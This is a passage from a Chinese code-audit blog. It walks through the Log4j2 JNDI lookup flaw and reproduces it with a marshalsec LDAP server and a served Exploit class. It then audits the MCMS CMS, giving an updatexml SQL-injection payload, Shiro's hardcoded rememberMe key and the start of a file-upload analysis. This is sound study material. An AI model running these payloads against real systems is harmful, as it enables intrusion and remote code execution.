+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gza9l1qn6nj31r00u0tc6.jpg" alt="image-20220209054419236"></p>
+<h1 id="0X05-漏洞分析"><a href="#0X05-漏洞分析" class="headerlink" title="0X05 漏洞分析"></a>0X05 漏洞分析</h1><p>断点</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog9ymltj20mo07uwf5.jpg" alt="image-20220218131441283"></p>
+<p>跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogij1txj20ys039gm1.jpg" alt="image-20220218131538411"></p>
+<p>logIfEnabled 判断日志是否开启，调用 isEnabled 判断，返回true，会调用 logMessage , 跟进 isEnabled</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog91kc1j213303174v.jpg" alt="image-20220218132154239"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogivjzbj212e08pjsq.jpg" alt="image-20220218132706187"></p>
+<p>红框中 this.intLever 是 log4j2 默认设置的日志等级，用户也可修改 默认是 200</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog877ztj20pv0f7wg7.jpg" alt="image-20220218133248862"></p>
+<p>判断 &gt;= 200 即日志成功开启, 返回 ture，随后调用 logMessage</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogfm0kyj211x03xaar.jpg" alt="image-20220218133544587"></p>
+<p>messageFactory.newMessage 对数据进行参数化，跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogohqv3j20y70ictbd.jpg" alt="image-20220218134307319"></p>
+<p>调用 logMessageTrackRecursion 递归处理日志</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogm69oyj20y608lq43.jpg" alt="image-20220218134652236"></p>
+<p>跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogjcl1rj211l075wg2.jpg" alt="image-20220218135004222"></p>
+<p>获取日志打印策略 getReliabilityStrategy ，跟进 log</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhpc4ctrdj214x0fajux.jpg" alt="image-20220218135347899"></p>
+<p>创建 logEvent，然后调用重载方法 log 处理 logEvent 信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhognje4jj211305a3zb.jpg" alt="image-20220218135520091"></p>
+<p>继续跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogcbu1kj213f05cjs6.jpg" alt="image-20220218135720629"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogda8qhj213406ogmi.jpg" alt="image-20220218135801326"></p>
+<p>加锁 callAppender 一直跟进带 callAppender 的方法，一直到 tryAppend</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhoged1ywj21050ckmyi.jpg" alt="image-20220218135943893"></p>
+<p>上面跟进的流程，大致是流程就是判断日志开启，参数化，打印策略，加锁等</p>
+<p>后续是 本次漏洞的关键点。</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogktvbej20qu0ljdj9.jpg" alt="image-20220218140611381"></p>
+<p>this.getlayout 是 PatternLayout 对象（处理日志格式对象），这里调用 PatternLayout 对象中的 encode 对日志进行处理</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogct62ij21440jljxs.jpg" alt="image-20220218141258031"></p>
+<p>toText 传递了两个参数</p>
+<ul>
+<li>this.eventSerializer 是处理日志的 11 个 formatters 对象 <ul>
+<li>org.apache.logging.log4j.core.pattern.DatePatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.LiteralPatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.LevelPatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.LoggerPatternConverter </li>
+<li>org.apache.logging.log4j.core.pattern.MessagePatternConverter (重点)</li>
+<li>org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter</li>
+<li> org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter</li>
+</ul>
+</li>
+<li>日志信息</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogo1hfdj212r0ae0u1.jpg" alt="image-20220218141803763"></p>
+<p>遍历不同的 formatters 对象处理日志信息，此次漏洞点就是在 MessagePatternConverter 对象中</p>
+<p>循环进入第八次时，跟进 format </p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogbv4y5j21u20gan02.jpg" alt="image-20220216083233931"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhoghzjnaj214k0fvwhu.jpg" alt="image-20220218142217976"></p>
+<p>this.noLookoups 为 false 即支持 jndi</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogf5g36j210t0g7mzm.jpg" alt="image-20220218142834755"></p>
+<p>这里匹配到 ${ 后，将内容交给 workingBuilder.append 匹配替换，跟进 workingBuilder.append</p>
+<p>继续跟进 substitute </p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogaxhb0j20xa07lt9t.jpg" alt="image-20220218142912425"></p>
+<p>这里是将 <code>${</code> <code>}</code> <code>[:,-]</code> 字符给替换成空了</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogh5ifoj214x0le42y.jpg" alt="image-20220218143525399"></p>
+<p>然后循环递归提取 ${} 中的内容</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogglvidj21450iq76v.jpg" alt="image-20220218144211635"></p>
+<p>提取完内容后交由 resolveVariable 处理,跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog8kzi4j212j0ghmzq.jpg" alt="image-20220218144904632"></p>
+<p>getVariableResolver 是 interplator 对象 ，包含 3个 map</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhog9htfzj20mu0hntae.jpg" alt="image-20220218145212375"></p>
+<p>其中 strLookup 将一些 lookup 功能关键字和对应的实例类进行了映射</p>
+<p>后面调用  resolver.lookup 处理，跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogn458rj21co0lbjvp.jpg" alt="image-20220218145727250"></p>
+<p>这里截取 jndi 跟进 jndi 获取到对应的 JndiLookup对象，然后调用 jndi 对象的 lookup 处理 payload 信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogbe2p4j215s0m8777.jpg" alt="image-20220218150354162"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogp0njcj215s0m8777.jpg" alt="image-20220218150354530"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogjsgu9j20g20brjrj.jpg" alt="image-20220218150416516"></p>
+<p>执行了恶意类，计算机反弹成功。</p>
+<p>有些地方还是有些懵逼，大致了解的差不多了, 后续还需要深入学习一下</p>
+<h1 id="0X06-漏洞复现"><a href="#0X06-漏洞复现" class="headerlink" title="0X06 漏洞复现"></a>0X06 漏洞复现</h1><p>marshalsec下载地址：<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a>   需自行编译成 jar 包</p>
+<p>编译好的下载地址：<a href="https://gitee.com/fcncdn/marshalsec-0.0.3/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar">https://gitee.com/fcncdn/marshalsec-0.0.3/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar</a></p>
+<p>在 java 目录下启个服务，得是 Exploit.java 目录，方便获取到恶意攻击类文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 -m http.server 83</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogeqnt2j20h9028glr.jpg" alt="image-20220215123103796"></p>
+<p>生成 class </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">javac Expload</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogafh93j20a103t3yg.jpg" alt="image-20220215123050606"></p>
+<p>使用 marshalsec 开启 ldap 服务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:83/\#Exploit</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogl6xd9j210501o3yq.jpg" alt="image-20220215123151296"></p>
+<p>注意：exp 默认执行的是 cmd1 弹出 计算器, 如果你是 mac 要注意计算器的目录，有些可能和exp中目录不一致导致计算器弹不出来。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhoghg7pyj20xq0ctq4n.jpg" alt="image-20220215123344212"></p>
+<p>做完准备工作后，运行 Test</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzhogg48plj21ay0j0afn.jpg" alt="image-20220215123438294"></p>
+<p>反弹成功</p>
+<h1 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a>0X07 参考链接</h1><p><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a></p>
+<p><a href="https://xz.aliyun.com/t/9053">https://xz.aliyun.com/t/9053</a></p>
+<p><a href="https://blog.csdn.net/angry_program/article/details/121994740">https://blog.csdn.net/angry_program/article/details/121994740</a></p>
+<p><a href="https://www.anquanke.com/post/id/263325">https://www.anquanke.com/post/id/263325</a></p>
+<p><a href="https://paper.seebug.org/1787/">https://paper.seebug.org/1787/</a></p>
+<p><a href="https://paper.seebug.org/1786/">https://paper.seebug.org/1786/</a></p>
+<p><a href="https://www.cnblogs.com/dengyungao/p/7524902.html">https://www.cnblogs.com/dengyungao/p/7524902.html</a></p>
+<p><a href="https://www.cnblogs.com/piaomiaohongchen/p/15711310.html">https://www.cnblogs.com/piaomiaohongchen/p/15711310.html</a></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java代码审计-MCMS</title>
+    <url>/2022/01/15/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-MCMS/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0X01-环境搭建"><a href="#0X01-环境搭建" class="headerlink" title="0X01 环境搭建"></a>0X01 环境搭建</h1><p>项目地址下载：<a href="https://gitee.com/mingSoft/MCMS">https://gitee.com/mingSoft/MCMS</a></p>
+<p>当前版本：5.2.5  也可下载的releases版本 5.2.4</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328ij8yzj31tc0u0dkq.jpg" alt="image-20220115193615578"></p>
+<p>PS：注意Mysql版本需大于5.6以上</p>
+<p>创建一个mcms数据库，并且导入doc/数据库文件</p>
+<p>在<code>application-dev</code>中修改数据库账户密码</p>
+<p>运行<code>MSApplication.java main</code>方法，如下图，环境无问题</p>
+<p>管理员：msopen/密码：msopen</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327uz18gj31dr0u0wh9.jpg" alt="image-20220115195620671"></p>
+<h2 id="外置环境配置"><a href="#外置环境配置" class="headerlink" title="外置环境配置"></a>外置环境配置</h2><p>搭建Tomcat环境</p>
+<blockquote>
+<p>注意：环境最好使用1.8版本，作者使用15版本，打包war时一直报错，版本不对，最后将1.8设置默认版本后才成功。</p>
+</blockquote>
+<p>编辑 pox.xml 修改打包方式为 war 包</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;!-- 打包成war包 --&gt;</span><br><span class="line">&lt;packaging&gt;war&lt;/packaging&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>添加依赖</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">  &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>修改启动类 src\main\java\net\mingsoft\MSApplication.java</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">@SpringBootApplication(scanBasePackages = {"net.mingsoft"})</span><br><span class="line">@MapperScan(basePackages={"**.dao","com.baomidou.**.mapper"})</span><br><span class="line">@ServletComponentScan(basePackages = {"net.mingsoft"})</span><br><span class="line">public class MSApplication extends SpringBootServletInitializer {</span><br><span class="line">    @Override</span><br><span class="line">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {</span><br><span class="line">        return builder.sources(MSApplication.class);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) {</span><br><span class="line">        SpringApplication.run(MSApplication.class, args);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>启动类爆红，导入包路径即可。</p>
+<p>使用maven打包，点击如下图标，设置</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328n6mjjj30vh0j840v.jpg" alt="image-20220118215206232"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328m8ynzj30sr0cgmy1.jpg" alt="image-20220118215232442"></p>
+<p>新建 tomcat server ，导入即可</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328mqubkj31ft0u0mzg.jpg" alt="image-20220118215629972"></p>
+<p>搭建成功，如果登录后提示分页插件出错</p>
+<p>原因：参考其他大佬的</p>
+<p>MSServletInitializer.java 文件从项目中删除即可,因为该类也继承了SpringBootServletInitializer类，所以导致PageHelper插件被配置了两次</p>
+<p>参考链接：<a href="https://www.zhihu.com/question/330677156">https://www.zhihu.com/question/330677156</a></p>
+<h2 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328lrcrrj30d30bgmxh.jpg" alt="image-20220118220646126"></p>
+<p>其中我们主要关注红框的三个目录</p>
+<ul>
+<li>Action  控制器层</li>
+<li>biz     业务逻辑层</li>
+<li>dao     数据库交互层</li>
+</ul>
+<p>并且在cms中并未发现全局过滤文件。</p>
+<p>作者后端技术框架</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327w2omuj30ui0u0n0a.jpg" alt="image-20220118222701099"></p>
+<h1 id="0X02-SQL注入漏洞"><a href="#0X02-SQL注入漏洞" class="headerlink" title="0X02 SQL注入漏洞"></a>0X02 SQL注入漏洞</h1><h2 id="MyBatis-SQL-注入前置知识"><a href="#MyBatis-SQL-注入前置知识" class="headerlink" title="MyBatis SQL 注入前置知识"></a>MyBatis SQL 注入前置知识</h2><p>根据作者发布的配置文档可知， 后端使用的是 ORM框架 MyBatis </p>
+<p>MyBatis 的 SQL 语句可以使用注解方法写在类方法上，也可以使用 xml 的方式，而使用的最多的方式就是将语句写入 xml 文件中。</p>
+<p>编写 xml 文件时，MyBatis  支持两种参数符号</p>
+<ul>
+<li><code>$</code>  – 拼接 SQL<ul>
+<li><code>#</code>  – 使用预编译</li>
+</ul>
+</li>
+</ul>
+<p>当语句使用 <code>$</code> 拼接时，则会产生 SQL 注入漏洞。</p>
+<p>参考链接：<a href="https://www.freebuf.com/vuls/240578.html">https://www.freebuf.com/vuls/240578.html</a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们关注 dao 目录，可以发现作者使用的是 xml 文件方式写入的</p>
+<p>右键点击 Find in Path 选中 File mask 在 dao 目录下搜索 xml 文件</p>
+<p><code>$</code> 搜索，发现有两条 select 语句均使用了 <code>$</code> 拼接参数 categoryId，跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328g9jqnj30u60jggp5.jpg" alt="image-20220118223834663"></p>
+<p>漏洞点：src/main/java/net/mingsoft/cms/dao/IContentDao.xml</p>
+<p>可以发现 这条 select 语句是属于 select 标签 id 是 query，说明是 query 方法调用</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327wsf69j311m0f7mzr.jpg" alt="image-20220118224150971"></p>
+<p>IContentDao.xml 对应的映射接口类是 net.mingsoft.cms.dao.c，此文件中并未找到 query 方法，此时我们继续跟进到父类 IBaseDao（net.mingsoft.base.dao.IBaseDao）</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327mbayxj310c0n676a.jpg" alt="image-20220118224431593"></p>
+<p>在父类 IBaseDao 中找到 query 方法，IContentDao 接口类 继承父类 IBaseDao，所以可调用 query 方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327oox1aj30i902xt8o.jpg" alt="image-20220118224807165"></p>
+<p>此时，我们需要去寻找 query 方法的对应的实现类。</p>
+<p>IContentDao 对应的业务接口是 net.mingsoft.cms.biz.IContentBiz，而实现类是net.mingsoft.cms.biz.impl.ContentBizImpl，同理，跟进 ContentBizImpl 的 父类 BaseBizImpl（net.mingsoft.base.biz.impl.BaseBizImpl）发现父类中实现了 query 方法，调用了 dao 层的 query 方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328f8pvnj30ms02nmxd.jpg" alt="image-20220118225654859"></p>
+<p>现在我们只需要跟进控制器层代码，寻找 categoryId 可控点，即可完成整个调用链。</p>
+<p>对应的控制器文件 src/main/java/net/mingsoft/cms/action/ContentAction.java 104行处</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327mxu6ej311w0nlwjv.jpg" alt="image-20220118230301298"> </p>
+<p><code>@ApiImplicitParam </code> 注解中定义了 categoryId 参数对应的是所属栏目，使用的方法是 query</p>
+<p>而 127行 对应的调用处是 list 并且使用 post 方法获取到上述所有需要查询的参数并放到 content 中，通过 query 方法去查询对应的数据</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328h1fddj31c007475e.jpg" alt="image-20220118230705712"></p>
+<p>此时我们可以去登录，验证漏洞是否存在</p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>功能大全-&gt;文章管理 抓包</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328o8ja0j31jy0quwq5.jpg" alt="image-20220118232135765"></p>
+<p>在 pageSize 后面添加 categoryId 参数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Payload: categoryId=1' and updatexml(1,concat(0x7e,databases(),0x7e),1) and '1</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327resuzj31uf0u0apv.jpg" alt="image-20220118232024944"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327sso1sj30im0amjsf.jpg" alt="image-20220118231714788"></p>
+<p>成功，同时可以使用 Mysql 数据库监控程序，查看和数据库交互的语句</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328jyi66j31n30u0wju.jpg" alt="image-20220118232519574"></p>
+<p>注入的语句</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">select count(0) from ( select ct.* from ( select ct.*,cc.category_path from cms_content ct join cms_category cc on ct.category_id=cc.id WHERE ct.del=0 and (ct.category_id='1'' and updatexml(1,concat(0x7e,user(),0x7e),1) and ''1' or ct.category_id in (select id FROM cms_category where find_in_set('1' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1',CATEGORY_PARENT_IDS)&gt;0)) )ct ORDER BY ct.content_datetime desc,content_sort desc ) tmp_count</span><br></pre></td></tr></tbody></table></figure>
+
+<p>抓包时，还发现了华点。。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rememberMe=rWugSNNLZQzRFHaq7ak+mgedIxoeZBy4qAquhNineUSo8u1NL/L4YCkX4vhDD9i1d/Hm2oBNc4ou74W/ALQNI5GYQH/tGQcYkffbwtjd4VZuoXD4D73yWZ3IGNIbVxXLJgk5WCc0VkOIizpA529fHxCurk4RLpC5K6EeX+J/TK8uGYnNtZyDz50BnbtF0UgntjTpRx++tnbB1XEpiUm4T/+AR1jH3U3RI/BCRXpAwg08lsFEBTYloTj+CqAHKMFCXOBIAdS4F/2pnHJfba7KU2JKNap0xu8maiRCs3+qYPncV3dpwzA8KyVOvnUIaNxOBSMEclpiQi1ykpwd32e4eqcC4Zey9lTJIp+znimCIszR5Qrn3SGewegH7BOrzdSkyHpDJxPWwejq9UYJ6ZkthidmrM8YVRHD8+kJGpkt/po42qP4JmGW6JP4Wt4StgsJZEO+bS/HjFwOpbDkJ3nnqZGaZzoAUmI+TaF8yPE9fmHNg01HtbiJsR8Ml6YcDXJdTOZ0xzPaGnUanggXwlL2x3DEndd0DKHfMHe8NNEe0KTMPoI+/ScWkF+Ogjomuo2mRqVMVWdYMsimMB73MFfW+9U/ugVVREqzSuH7Ym1KdwvtsCrQBMjLBz7P6d10Uvi2zL8g86u8wKhKoBg5gu8jmO8tQJkdb53VMpYNpyc8SnujThz/CQgyRjPRJ6v9lINR7rRQ0SjTU2wHIJfToaIOerDgxj2wTcw2tcLJKj8fj0DamOAdXrNhayx1xHYS16bU9PO3TteshfPCPOBrC31SKKY1RxTMBcMFrDTApI0n9eSOhDttMHp879iibCXXgH17TfrXIsymd+5iSCpkKJCruhwZJyi8TtvShgotzE0OumKObevO2p1/D2lWX1yuZ2zL2wSMtKReGo5g8ONab5bOQsp+B++LjFhLUsBLqWiBT1L8wNwJl5yTy1jgdpC2tmkz0judbdp/h9E6J9pDEhUsUllYeVyzadnCYugRDMrNbcDFusdUKOUZrz8yBLTuHcPopP1hmDJnotSnvKuAdg36mUzuipolOMGHz49OkAzQE9y8aV1S33hBMs8dCF+1bL+VZYKlpPriP5LWrEiKzf3v/L9sojsDrLzbhZjbBaZ2zkUdh9O/dyWyw4hBSNVUYmO3pjTjIWBbhiBFKjc12S6jcTP/QPkY1i9deoMhMhHuP0gYlNiL4YLpsnXnAwaElaTutHWPbQcHQhXQounbYJRIVGiXCj3aLNQ4wgOlZdLMAvcAoyRljrIrjQJcfInuQNCKMYf5d9ZbtCfB3NJyZ3H3ff56pS+ipZfJ6RMIijqMFHs448CGn0lqJjpFD/bH+CTQIEvwF7tHJw==</span><br></pre></td></tr></tbody></table></figure>
+
+<p>网站还使用 shiro 框架，后续可以跟踪一下此漏洞。</p>
+<h1 id="0X03-shiro反序列化"><a href="#0X03-shiro反序列化" class="headerlink" title="0X03 shiro反序列化"></a>0X03 shiro反序列化</h1><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>shiro配置文件：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">repository/net/mingsoft/ms-basic/2.1.10/ms-basic2.1.10.jar!/net/mingsoft/config/ShiroConfig.class</span><br></pre></td></tr></tbody></table></figure>
+
+<p>mcms作者将核心一些配置文件封装成 <code>ms-basic2.1.10.jar</code> </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328nv0b7j31o40u0qbe.jpg" alt="image-20220121223946513"></p>
+<p>打个断点到 ShiroConfig 的 rememberMeManager</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz328016zhj311r0jfn0n.jpg" alt="image-20220203032307242"></p>
+<p>可以看见获取到默认 key 值 <code>4AvVhmFLUs0KTA3Kprsdag==</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328iwikej30la0b7mxw.jpg" alt="image-20220203032355314"></p>
+<p>这里获取的 <code>MCMS-master/src/main/resources/application.yml</code> 配置文件中的值</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328fq1okj30oc0c3ab1.jpg" alt="image-20220203034128375"></p>
+<p>之前我们跟过 shiro 反序列化漏洞，知道触发点在</p>
+<p><code>org/apache/shiro/shiro-all/1.8.0/shiro-all-1.8.0.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.class</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328gtjhnj31hd0u0dlg.jpg" alt="image-20220204072028555"></p>
+<p>跟进 <code>getRemeberedPrincipals</code> , <code>this.getCookie().readValue</code> 获取cookie值 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328enjboj31420e2wh5.jpg" alt="image-20220205230432146"></p>
+<p>再对比 cookie 值是否为 deleteME ，不匹配，走到 decoded = Base64.decode(base64) 解密 base64</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327yj0azj312b04mq3t.jpg" alt="image-20220205230934752"></p>
+<p>返回一串 AES 加密的 bytes 值，走完后，会跳回到  <code>getRemeberedPrincipals</code> 执行下一个方法 </p>
+<p><code>convertBytesToPrincipals</code> 这个方法是解密并进行反序列化</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327nu6a1j310c0n676a.jpg" alt="image-20220205231141049"></p>
+<p>跟进 decrypt ， getCipherService AES加密类，说明当前使用的加密是 AES/GCM/NoPadding 分组加密不填充模式</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328hk7mgj31300mbjvu.jpg" alt="image-20220205231356313"></p>
+<p><code>cipherService.decrypt(encrypted, this.getDecryptionCipherKey())</code> 解密，<code>getDecryptionCipherKey</code> 获取密钥，密钥是在配置文件中获取的</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328kbucxj30v00jeju4.jpg" alt="image-20220205232313984"></p>
+<p>通过 <code>setCipherKey</code> 设置密钥，<code>rememberMeManager</code> 返回的是 <code>CookieRememberMeManager</code> 对象，而 <code>CookieRememberMeManager</code> 继承 <code>AbstractRememberMeManager</code> 类</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz32820jw1j30r10eaabk.jpg" alt="image-20220205232615287"></p>
+<p>所以 <code>AbstractRememberMeManager</code> 构造方法接收到了密钥 <code>4AvVhmFLUs0KTA3Kprsdag==</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328ksbf9j30va0bf76i.jpg" alt="image-20220205232643299"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328l9m83j30ko0bkq41.jpg" alt="image-20220205233037004"></p>
+<p>解密后，返回一串 序列化值</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328i10zbj312n07cq4e.jpg" alt="image-20220205233135677"></p>
+<p>调用 deserialize 反序列化</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz328je656j312j081gmv.jpg" alt="image-20220205233258162"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz32810p76j311x0qq0xq.jpg" alt="image-20220205233341052"></p>
+<p>反序列化出来的内容，就是我们当前用户的信息。</p>
+<p>打个 payload 看看反序列的内容是不是命令执行。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327u24t9j313g0rmtg4.jpg" alt="image-20220205233615921"></p>
+<p>payload 成功反序列化出来 </p>
+<h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz327pp4r5j30rf0iu75w.jpg" alt="image-20220205233706880"></p>
+<h1 id="0X04-文件上传漏洞"><a href="#0X04-文件上传漏洞" class="headerlink" title="0X04 文件上传漏洞"></a>0X04 文件上传漏洞</h1><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>文件上传接口</p>
+<p><code>repository/net/mingsoft/ms-basic/2.1.10/ms-basic-2.1.10.jar!/net/mingsoft/basic/action/ManageFileAction.class</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3sy40oj31n60u0wks.jpg" alt="image-20220206211531476"></p>
+<p>当我们上传文件时，<code>upload</code> 获取上传的文件信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3n4qdzj31i10u0thp.jpg" alt="image-20220207035014696"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3pd6jjj31kb0u0wnc.jpg" alt="image-20220207035118947"></p>
+<p>而 <code>this.upload</code> 处理上传操作，跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3q4llgj32e20saqcu.jpg" alt="image-20220207035302222"></p>
+<p><code>MCMS-master/src/main/resources/application.yml</code> 配置文件内容</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gz4g3rj7cyj317j0u0432.jpg" alt="image-20220207035556247"></p>
